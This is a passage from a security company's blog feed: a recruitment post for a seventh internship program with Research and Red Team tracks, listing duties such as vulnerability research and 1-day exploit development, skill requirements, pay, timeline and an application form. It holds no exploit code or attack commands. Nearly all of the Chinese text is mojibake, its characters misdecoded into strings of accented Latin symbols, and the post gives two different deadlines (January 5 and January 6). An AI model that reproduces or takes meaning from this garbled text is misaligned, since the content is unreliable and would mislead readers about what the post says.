  &lt;li&gt;Âª∂Èï∑Â†±ÂêçÊôÇÈñìÔºå‰∏¶Êé°ÂèñÊõ¥ÂΩàÊÄßÁöÑÁî≥Ë´ãÊñπÂºèÔºåËÆìÂêåÂ≠∏ËÉΩÂÖÖÂàÜÂ±ïÁèæËá™Ë∫´ÂØ¶Âäõ&lt;/li&gt;
  &lt;li&gt;ÊèêÊó©ÂÖ¨Â∏ÉÁµêÊûúÔºåËÆìÂêåÂ≠∏Êõ¥ÈùàÊ¥ªÂú∞Ë¶èÂäÉÂæåÁ∫åË°åÁ®ã&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÊàëÂÄë‰πüÂª∂Á∫å‰∫Ü‰∏ä‰∏ÄÂ±ÜÁöÑÂàÜÁµÑÊñπÂºèÔºåËÆìÂêåÂ≠∏ÂÄëËÉΩÊ†πÊìöËààË∂£ËàáÂ∞àÈï∑ÈÅ∏ÊìáÂêàÈÅ©ÁöÑÁµÑÂà•Ôºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Research ÁµÑÔºöÈÅ©ÂêàÂ∞çÊºèÊ¥ûÁ†îÁ©∂ÊúâËààË∂£„ÄÅÊÉ≥ÊåñÊéòÁúüÂØ¶ÊºèÊ¥ûÁöÑÂêåÂ≠∏&lt;/li&gt;
  &lt;li&gt;Red Team ÁµÑÔºöÈÅ©ÂêàÂ∞çÁ¥ÖÈöäÊäÄË°ìÊúâËààË∂£„ÄÅÊÉ≥Á≤æÈÄ≤Êª≤ÈÄèÊäÄÂ∑ßÁöÑÂêåÂ≠∏&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊÇ®ÊúüÂæÖÂä†ÂÖ•ÊàëÂÄë„ÄÅÁ≤æÈÄ≤Ë≥áÂÆâÊäÄËÉΩÔºåÁÖ©Ë´ãË©≥Èñ±‰∏ãÂàóË≥áË®äÂæåÂ°´ÂØ´Ë°®ÂñÆÂ†±ÂêçÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Research Âèä Red Team ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂàÜÊûêÂèäÊí∞ÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 60 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;ÊàêÊûúÂ†±ÂëäËàáÊ∫ñÂÇô 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
Á†îÁ©∂‰∏¶Ê∑±ÂÖ•Â≠∏ÁøíÁ¥ÖÈöäÂ∏∏Áî®ÊäÄÂ∑ßÔºåÁÜüÊÇâÂØ¶Êà∞‰∏≠ÊúÉÈÅáÂà∞ÁöÑÊÉÖÂ¢É„ÄÅË™ûË®ÄËàáÊû∂Êßã„ÄÇ‰∫ÜËß£Â∏∏Ë¶ãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂØ¶ÈöõÂà©Áî®ÊñπÊ≥ï„ÄÅÂö¥ËãõÊ¢ù‰ª∂‰∏ãÁöÑÂà©Áî®Á≠ñÁï•„ÄÅÈªëÁÆ±Ê∏¨Ë©¶ÊñπÂºèÂèäÂêÑÁ®ÆÂ•áÊäÄÊ∑´Â∑ß„ÄÇÂ≠∏ÁøíÂæåÊª≤ÈÄèÊôÇÁöÑÂ∏∏Ë¶ãÈôêÂà∂„ÄÅÂ∑•ÂÖ∑Ê¶ÇÂøµËàáÂéüÁêÜ„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûËàáÊäÄÂ∑ßÁöÑÁ†îÁ©∂ÂèäÊ∑±ÂÖ•Â≠∏Áøí 70 %&lt;/li&gt;
      &lt;li&gt;Lab Âª∫ÁΩÆÊàñ Bug Bounty ÊàñÊºèÊ¥ûÊåñÊéò 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2025 Âπ¥ 3 ÊúàÂàùÂà∞ 2025 Âπ¥ 7 ÊúàÂ∫ïÔºåÂÖ± 5 ÂÄãÊúà&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÂÖ∂‰∏≠‰∏ÄÂ§© 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏ÂêåÊ≠•ÈÄ≤Â∫¶ÔºåÂÖ∂È§òÊôÇÈñìÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
      &lt;li&gt;Â¶ÇÊûúÂ±Ö‰ΩèÈõôÂåóÂ§ñÂèØÂΩàÊÄßË™øÊï¥ÂêåÊ≠•ÊñπÂºèÔºå‰ΩÜÈ†àÊØèÂÄãÁµÑÂà•Áµ±‰∏Ä&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏ÁîüÔºå‰∏îÂèØÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©&lt;/li&gt;
  &lt;li&gt;ÁÑ°ÂÖ∂‰ªñÊãõÂãüÈôêÂà∂ÔºåÊ≠∑Â±ÜÂØ¶ÁøíÁîüÂèØÈáçË§áÊáâÂæµ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Red Team ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 18,000 ÂÖÉÔºàÂè¶Ë£úÂä©ÈÉ®ÂàÜ‰∫§ÈÄöË≤ªÔºâ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ÂèäÊåñÊéòËÉΩÂäõ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁç®Á´ãÂàÜÊûêÈñãÊîæÂéüÂßãÁ¢ºÂ∞àÊ°àÁöÑËÉΩÂäõÔºåËÉΩÈÄèÈÅéÂàÜÊûêÁ®ãÂºèÁ¢ºÁêÜËß£ÁõÆÊ®ôÂ∞àÊ°àÁöÑÊû∂Êßã&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰∏¶ÁêÜËß£Â∏∏Ë¶ãÁöÑÊºèÊ¥ûÊàêÂõ†
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;‚Ä¶&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅwrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÊàñÊ°ÜÊû∂ÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅExpress.jsÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ&lt;/li&gt;
      &lt;li&gt;ÁêÜËß£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ‰∏≠ÁöÑÂÆâÂÖ®Ë≠∞È°å&lt;/li&gt;
      &lt;li&gt;Áç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥ûÔºåÊàñÂàÜÊûêÈÅé 1-day ÁöÑÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÂøÖË¶ÅÊ¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;ÁêÜËß£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab&lt;/li&gt;
      &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ&lt;/li&gt;
      &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèÈñãÁôºÊñπÂºèÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ&lt;/li&gt;
      &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ã‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApache„ÄÅTomcat„ÄÅIIS„ÄÅActive DirectoryÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinux„ÄÅWindowsÔºâÁöÑËÉΩÂäõ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day Exploit&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∫åÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπ&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÁ≠îÊ°à
    &lt;ul&gt;
      &lt;li&gt;ÊáâÂæµ Research ÂØ¶ÁøíÁîüÔºö
        &lt;ul&gt;
          &lt;li&gt;È°åÁõÆ‰∏ÄÔºöÊºèÊ¥ûÈáçÁèæËàáÂàÜÊûêÈÅéÁ®ã
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏ÄÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2022 ~ 2025 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Ë©≥Ëø∞Ë™™ÊòéÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇÂêåÊôÇÔºåÂòóË©¶ÊèèËø∞Â¶Ç‰ΩïÂæ©ÁèæÊ≠§ÊºèÊ¥ûÊàñÊîªÊìäÈèàÔºåÂç≥‰ΩøÁÑ°Ê≥ïÊàêÂäüÂæ©ÁèæÔºå‰πüË´ãË®òÈåÑÁ†îÁ©∂ÈÅéÁ®ã„ÄÇÂ†±ÂëäÊí∞ÂØ´Ë´ãÂèÉËÄÉ&lt;a href=&quot;/assets/files/recruit/DEVCORE-intern_vulnerability_analysis_example.pdf&quot;&gt;ÁØÑÊú¨&lt;/a&gt;ÔºåÁõ°ÂèØËÉΩË©≥Á¥∞Ôºå‰∏≠Ëã±‰∏çÈôê„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;È°åÁõÆ‰∫åÔºöÂØ¶ÁøíÊúüÈñìÊÉ≥Ë¶ÅÁ†îÁ©∂ÁöÑ‰∏ªÈ°å
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏âÂÄãÂèØËÉΩÈÅ∏ÊìáÁöÑÊòéÁ¢∫‰∏ªÈ°åÔºå‰∏¶Á∞°ÂñÆË™™ÊòéÊèêÂá∫ÁöÑÁêÜÁî±ÊàñÊÉ≥ÂÆåÊàêÁöÑÂÖßÂÆπÔºå‰æãÂ¶ÇÔºö
                &lt;ul&gt;
                  &lt;li&gt;Á†îÁ©∂‚óØ‚óØÈñãÊ∫êËªüÈ´îÔºåÊâæÂà∞ÂèØ RCE ÁöÑÈáçÂ§ßÈ¢®Èö™Âº±Èªû„ÄÇ&lt;/li&gt;
                  &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑË∑ØÁî±Âô®ÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöAA-123 Ë∑ØÁî±Âô®„ÄÅBB-456 ÁÑ°Á∑öË∑ØÁî±Âô®„ÄÇ&lt;/li&gt;
                  &lt;li&gt;Á†îÁ©∂Â∏∏Ë¶ãÁöÑÁ≠ÜË®òÂπ≥Âè∞ÊàñËªüÈ´îÔºåÁõÆÊ®ôÂåÖÊã¨ÔºöXX Note„ÄÅYY Note„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÊáâÂæµ Red Team ÂØ¶ÁøíÁîüÔºö
        &lt;ul&gt;
          &lt;li&gt;Ë´ãÊèêÂá∫ÂÖ©ÂÄãÊñºË•øÂÖÉ 2022 ~ 2025 Âπ¥ÈñìÂÖ¨ÈñãÁöÑ„ÄÅËàá Web ÊîªÊìäÈù¢„ÄÅÁ¥ÖÈöäÊâãÊ≥ï„ÄÅÊºèÊ¥ûÊàñÊîªÊìäÈèàÁõ∏ÈóúÁöÑÊäÄË°ìÊºîË¨õÔºåË´ãË™™ÊòéÁÇ∫‰ªÄÈ∫ºÊåëÈÅ∏ÈÄô‰∫õÊºîË¨õ‰∏¶Ëß£ÈáãÂÆÉÂÄëÁÇ∫‰ªÄÈ∫ºÊúâË∂£„ÄÇ
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÁî®‰Ω†ÁöÑÁêÜËß£ÈáçÊñ∞‰ª•ÊñáÂ≠óË©≥Á¥∞Ëß£ÈáãÈÄô‰∫õÊºîË¨õÁöÑÊäÄË°ìÁ¥∞ÁØÄÔºåÊï¥ÁêÜÊàê‰∏Ä‰ªΩ Write-up ‰ª• PDF Ê†ºÂºèËº∏Âá∫Ôºå‰∏¶Êèê‰æõ‰ªª‰Ωï‰Ω†Ë¶∫ÂæóÂèØ‰ª•ËºîÂä©ÊàñË≠âÊòé‰Ω†ÁêÜËß£ÁöÑÈôÑÂä†Ë≥áÊñô„ÄÇ&lt;/li&gt;
              &lt;li&gt;ÈÄô‰∫õÊºîË¨õÂèØ‰ª•‰æÜËá™ÂåÖÂê´‰ΩÜ‰∏çÈôêÊñº Black Hat„ÄÅDEF CON„ÄÅOffensiveCon„ÄÅPOC„ÄÅZeroConf„ÄÅHexacon„ÄÅHITCON„ÄÅTROOPERS CONFERENCE Á≠âÊúÉË≠∞„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;

&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 30~120 ÂàÜÈêòÔºà‰æùÁÖßÁµÑÂà•ÈúÄÊ±ÇËÄåÂÆöÔºåÊúÉÂè¶Ë°åÈÄöÁü•ÔºâÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2024/12/02 - 2025/01/05 ÂÖ¨ÈñãÊãõÂãüÔºåÊé•Êî∂Â±•Ê≠∑ËàáÁ¨¨‰∏ÄÈöéÊÆµÂØ©Ê†∏&lt;/li&gt;
  &lt;li&gt;2025/01/06 - 2025/01/23 Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶ÔºàËã•Â†±ÂêçË∏¥Ë∫çÊúÉÊèêÂâçÈñãÂßãÈù¢Ë©¶Ôºâ&lt;/li&gt;
  &lt;li&gt;2025/01/24 ÂâçÂõûÊáâÁµêÊûú&lt;/li&gt;
  &lt;li&gt;2025/03/03 Á¨¨‰∏ÉÂ±ÜÂØ¶ÁøíË®àÁï´ÊñºÁï∂ÈÄ±ÈñãÂßã&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;p&gt;ÁÇ∫‰∫ÜËÆìÊúâÊÑèÂèÉÂä†ÂØ¶ÁøíË®àÁï´ÁöÑÂêåÂ≠∏ÊúâÊõ¥Â§öÊôÇÈñìÊ∫ñÂÇôÔºåÊàëÂÄëÈÄôÊ¨°ÂòóË©¶‰ΩøÁî® Google Ë°®ÂñÆ‰ΩúÁÇ∫Â†±ÂêçÂπ≥Âè∞„ÄÇÊÇ®ÂèØ‰ª•ÈÄèÈÅéÂ°´ÂØ´Ë°®ÂñÆÈÄ≤Ë°åÂ†±ÂêçÔºå‰∏îÂú®Êà™Ê≠¢ÊôÇÈñì &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; ‰ª•ÂâçÔºåÊÇ®ÂèØ‰ª•Èö®ÊôÇÁ∑®ËºØÂ∑≤Êèê‰∫§ÁöÑË°®ÂñÆÔºåÊàñÊòØÈáçÊñ∞Â°´ÂØ´‰∏Ä‰ªΩÊñ∞ÁöÑË°®ÂñÆ‰æÜÊõ¥Êñ∞Â†±ÂêçË≥áË®ä„ÄÇË´ãÊ≥®ÊÑèÔºåÊàëÂÄëÊúÉ‰ª•&lt;strong&gt;ÊúÄÂæå‰∏ÄÊ¨°&lt;/strong&gt;Êèê‰∫§ÁöÑË°®ÂñÆÂÖßÂÆπ‰ΩúÁÇ∫ÂØ©Ê†∏‰æùÊìö„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë´ãÊñº &lt;strong&gt;2025/01/05 23:59&lt;/strong&gt; ÂâçÂÆåÊàêÂ°´ÂØ´ &lt;a href=&quot;https://forms.gle/CWW7aeebXXVt3kjv6&quot;&gt;Google Ë°®ÂñÆ&lt;/a&gt;‰∏¶‰∏äÂÇ≥Áõ∏ÈóúÈôÑ‰ª∂„ÄÇ‰ª•‰∏ãÁÇ∫Â°´ÂØ´Ë°®ÂñÆÁöÑÊ≥®ÊÑè‰∫ãÈ†ÖÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Ê™îÊ°àÁ∂ì‰∏äÂÇ≥ÂæåÁÑ°Ê≥ïÂà™Èô§Êàñ‰øÆÊîπÔºåÊ¨≤Êõ¥Êñ∞Ê™îÊ°àË´ãÈáçÊñ∞Â°´ÂØ´‰∏Ä‰ªΩË°®ÂñÆ&lt;/li&gt;
  &lt;li&gt;Ë´ãÂãôÂøÖÊñº&lt;strong&gt;Êà™Ê≠¢ÊôÇÈñìÔºà2025/01/06 23:59Ôºâ&lt;/strong&gt; ÂâçÂÆåÊàêÊâÄÊúâË°®ÂñÆÂ°´ÂØ´ËàáÊ™îÊ°à‰∏äÂÇ≥ÔºåÈÄæÊúüÊú™ÂÆåÊàêËÄÖÂ∞áË¶ñÂêåÊîæÊ£ÑÊáâÂæµË≥áÊ†º&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â†±ÂêçÊà™Ê≠¢ÂæåÔºåÊàëÂÄëÊúÉÊ†πÊìöÊÇ®Êèê‰∫§ÁöÑÂ†±ÂêçÂÖßÂÆπÈÄ≤Ë°åÁ¨¨‰∏ÄÈöéÊÆµÂØ©Ê†∏„ÄÇÂØ©Ê†∏ÁµêÊûúÂ∞áÊñº &lt;strong&gt;2025/01/13&lt;/strong&gt; ÂâçÈÄöÁü•Ôºå‰∏¶ÂÆâÊéíÈÄ≤‰∏ÄÊ≠•ÁöÑÈù¢Ë©¶„ÄÇÊúÄÁµÇÈåÑÂèñÂêçÂñÆÂ∞áÊñº &lt;strong&gt;2025/01/24&lt;/strong&gt; ÂÖ¨‰ΩàÔºåÊàëÂÄë‰πüÊúÉÂêåÊ≠•ÈÄöÁü•ÈåÑÂèñÊÉÖÊ≥Å„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæãÂØÑ‰ø°Âà∞ recruiting_intern@devco.reÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/12/02/7th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2024/12/02/7th-internship-program-recruit</guid>
                <pubDate>Mon, 02 Dec 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</title>
